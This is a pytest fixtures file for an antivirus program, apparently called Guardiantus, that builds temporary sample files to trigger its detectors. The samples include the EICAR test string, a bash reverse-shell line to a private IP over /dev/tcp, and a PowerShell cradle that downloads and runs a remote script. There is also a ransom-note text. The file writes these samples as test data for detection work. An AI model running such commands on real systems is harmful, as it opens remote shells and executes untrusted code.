"""Shared fixtures.

Every test runs against a throwaway ``GUARDIANTUS_HOME`` so nothing touches the
developer's real installation, and all module-level singletons are reset
between tests.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))


def _reset_singletons() -> None:
    from guardiantus import application, config
    from guardiantus.core import db, quarantine, realtime, scanner, scheduler, signatures, yara_engine
    from guardiantus.updater import programs

    application.reset_app_cache()
    programs._INSTANCE = None
    realtime.reset_realtime_cache()
    scheduler.reset_scheduler_cache()
    quarantine.reset_quarantine_cache()
    db.reset_db_cache()
    signatures.reset_signature_cache()
    yara_engine.reset_yara_cache()
    config.reset_config_cache()
    scanner._MANAGER = None


@pytest.fixture(autouse=True)
def isolated_home(tmp_path, monkeypatch):
    """Point the whole application at a fresh data directory."""
    home = tmp_path / "gav-home"
    home.mkdir()
    monkeypatch.setenv("GUARDIANTUS_HOME", str(home))
    _reset_singletons()
    yield home
    _reset_singletons()


@pytest.fixture
def app(isolated_home):
    from guardiantus.application import get_app

    application = get_app()
    yield application
    application.shutdown()


@pytest.fixture
def scanner(isolated_home):
    from guardiantus.core.scanner import FileScanner

    return FileScanner()


@pytest.fixture
def samples(tmp_path):
    """A directory of harmless files that nonetheless trip each detector."""
    directory = tmp_path / "samples"
    directory.mkdir()

    (directory / "clean.txt").write_text("Just an ordinary note about groceries.\n")

    # The EICAR test string, assembled at runtime so this source file itself
    # is not a detectable sample.
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + "!$H+H*"
    (directory / "eicar.com").write_text(eicar)

    (directory / "probe.txt").write_text("GUARDIANTUS-AV-SIGNATURE-SELFTEST-FILE-DO-NOT-REMOVE\n")

    (directory / "shell.sh").write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n")

    (directory / "cradle.ps1").write_text(
        '$c = New-Object System.Net.WebClient\n'
        'Invoke-Expression $c.DownloadString("http://example.invalid/x.ps1")\n'
    )

    (directory / "ransom_note.txt").write_text(
        "All your files are encrypted.\n"
        "To decrypt your files send bitcoin to our wallet.\n"
        "Reach us through the tor browser. Your decryption key is safe with us.\n"
    )
    return directory
